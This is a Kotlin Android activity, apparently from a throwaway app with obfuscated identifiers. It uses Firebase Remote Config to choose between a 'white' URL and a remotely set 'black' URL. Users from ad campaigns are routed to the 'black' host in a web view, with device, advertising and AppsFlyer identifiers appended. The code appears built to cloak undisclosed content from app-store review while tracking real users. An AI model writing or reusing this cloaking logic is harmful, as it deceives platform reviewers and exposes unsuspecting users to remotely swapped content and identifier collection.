package com.jokas.citys.pot.com

import android.content.Intent
import android.net.Uri
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.transition.ChangeBounds
import android.transition.Scene
import android.transition.TransitionManager
import android.widget.ProgressBar
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityOptionsCompat
import androidx.lifecycle.lifecycleScope
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class MainActivity34ujy1 : AppCompatActivity() {
    @RequiresApi(Build.VERSION_CODES.M)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main_34ujy1)
        getSharedPreferences("SP_34ujy1", MODE_PRIVATE).getString("Last_Page_34ujy1", null)?.let {
            startActivity(Intent(this, WebActivity34ujy1::class.java))
            finish()
        }
        Firebase.remoteConfig.run {
            setConfigSettingsAsync(
                remoteConfigSettings {
                    minimumFetchIntervalInSeconds = 1000
                })
            setDefaultsAsync(
                mapOf(
                    FB_BLACK_KEY_34ujy1 to "empty"
                )
            )
            fetchAndActivate().addOnCompleteListener {
                if (it.isSuccessful) {
                    fbBlackValue34ujy1 = getString(FB_BLACK_KEY_34ujy1)
                    fbDefaultValue34ujy1 = getString(FB_DEFAULT_KEY_34ujy1)
                    fbWhiteValue34ujy1 = getString(FB_WHITE_KEY_34ujy1)
                }
            }
        }
        clickSetup34ujy1 {
            it.isClickable = false
            TransitionManager.go(Scene.getSceneForLayout(findViewById(R.id.cl_34ujy1), R.layout.scene_main_34ujy1, this),ChangeBounds())
            lifecycleScope.launch {
                animationBackGround34ujy1()
                for (i34ujy1 in 0..100) {
                    findViewById<ProgressBar>(R.id.pb_34ujy1).progress = i34ujy1
                    delay(50)
                }
                parsedURL34ujy1 = if (fbBlackValue34ujy1 == null || fbBlackValue34ujy1 == "empty") {
                    fbWhiteValue34ujy1 ?: return@launch
                } else {
                    if (status34ujy1 == "Non-organic") {
                        if (key34ujy1.toString().length != 20) {
                            Uri.parse(fbBlackValue34ujy1).buildUpon()
                                .appendQueryParameter("key", fbDefaultValue34ujy1)
                                .appendQueryParameter("bundle", packageName)
                                .appendQueryParameter("sub4", adGroup34ujy1)
                                .appendQueryParameter("sub5", adSet234ujy1)
                                .appendQueryParameter("sub6", afChannel34ujy1)
                                .appendQueryParameter("sub7", "Default")
                                .toString()
                                .plus(
                                    "&sub10=$uid34ujy1||$AID34ujy1||${
                                        CODE_APPSFLYER_34ujy1.decodeStrings34ujy1()
                                    }"
                                )

                        } else {
                            Uri.parse(fbBlackValue34ujy1).buildUpon()
                                .appendQueryParameter("key", key34ujy1)
                                .appendQueryParameter("bundle", packageName)
                                .appendQueryParameter("sub2", sub234ujy1)
                                .appendQueryParameter("sub3", sub334ujy1)
                                .appendQueryParameter("sub4", adGroup34ujy1)
                                .appendQueryParameter("sub5", adSet234ujy1)
                                .appendQueryParameter("sub6", afChannel34ujy1)
                                .appendQueryParameter("sub7", mediaSource34ujy1)
                                .toString()
                                .plus(
                                    "&sub10=$uid34ujy1||$AID34ujy1||${
                                        CODE_APPSFLYER_34ujy1.decodeStrings34ujy1()
                                    }"
                                )

                        }
                    } else {
                        Uri.parse(fbBlackValue34ujy1).buildUpon()
                            .appendQueryParameter("key", fbDefaultValue34ujy1)
                            .appendQueryParameter("bundle", packageName)
                            .appendQueryParameter("sub7", "Organic")
                            .toString()
                            .plus(
                                "&sub10=$uid34ujy1||$AID34ujy1||${
                                    CODE_APPSFLYER_34ujy1.decodeStrings34ujy1()
                                }"
                            )

                    }
                }
                startActivity(Intent(this@MainActivity34ujy1, WebActivity34ujy1::class.java),
                    ActivityOptionsCompat.makeSceneTransitionAnimation(this@MainActivity34ujy1,
                        findViewById(R.id.v_34ujy1),
                        "view_in")
                        .toBundle())

            }
        }

    }

    override fun onStop() {
        finish()
        super.onStop()
    }
}